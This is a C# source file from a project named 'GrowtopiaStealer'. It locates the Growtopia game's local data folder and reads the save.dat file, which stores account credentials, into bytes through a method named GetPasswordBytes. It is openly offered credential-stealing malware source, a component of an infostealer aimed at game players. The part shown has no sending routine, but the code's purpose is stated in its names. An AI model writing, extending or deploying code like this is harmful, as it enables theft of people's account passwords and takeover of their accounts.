using System;
using System.IO;
using System.Text;

namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
{
    class Growtopia
    {
        #region Growtopia Paths
        // Growtopia folder path
        public static string dirPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia";
        // Growtopia save.dat path
        public static string savePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat";
        #endregion
        public static void GrowtopiaExistOrNo()
        {
                DirectoryInfo growtopia = new DirectoryInfo(Path.Combine(dirPath));
            // Stop if not exists
            if (!growtopia.Exists)
                return;
        Counting.Growtopia++;
        }

        public static byte[] GetPasswordBytes()
        {
            try
            {
                File.Open(Growtopia.savePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                using (FileStream stream = new FileStream(Growtopia.savePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (StreamReader streamReader = new StreamReader(stream, Encoding.Default))
                    {
                        return Encoding.Default.GetBytes(streamReader.ReadToEnd());
                    }
                }
            }
            catch
            {
                return null;
            }
        }
    }
}